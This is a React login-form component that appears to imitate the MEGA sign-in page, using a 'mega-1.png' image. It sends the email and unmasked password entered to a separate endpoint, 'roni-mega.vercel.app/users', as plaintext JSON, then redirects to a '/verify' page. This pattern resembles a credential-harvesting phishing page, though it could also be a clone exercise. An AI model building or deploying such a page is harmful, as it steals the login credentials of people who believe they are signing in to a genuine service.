import React from "react";
import { useForm } from "react-hook-form";
import mega1 from "../Img/mega-1.png";
import "./Login.css";
import { useNavigate } from "react-router-dom";

const Login = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const navigate = useNavigate();

  const onSubmit = (data) => {
    const ItemId = {
      Email: data.example,
      Password: data.exampleRequired,
    };
    fetch("https://roni-mega.vercel.app/users", {
      method: "POST",
      headers: { "Content-type": "application/json" },
      body: JSON.stringify(ItemId),
    })
      .then((res) => res.json())
      .then((result) => navigate("/verify"));
  };

  return (
    <>
      <form onSubmit={handleSubmit(onSubmit)}>
        {/* register your input into the hook by invoking the "register" function */}
        <div className="text-center">
          <input
            className="form-control Email"
            placeholder="Email"
            defaultValue=""
            {...register("example", { required: true })}
          />
        </div>

        {/* include validation with required or other standard HTML validation rules */}
        <div>
          <input
            className="form-control Email mt-2"
            placeholder="Password"
            defaultValue=""
            {...register("exampleRequired", { required: true })}
          />
        </div>
        {/* errors will return when field validation fails  */}
        {errors.exampleRequired && <span>This field is required</span>}

        <div className="p-2 mega1">
          <img src={mega1} alt="" />
        </div>

        <input className="submit" type="submit" />
      </form>
    </>
  );
};

export default Login;
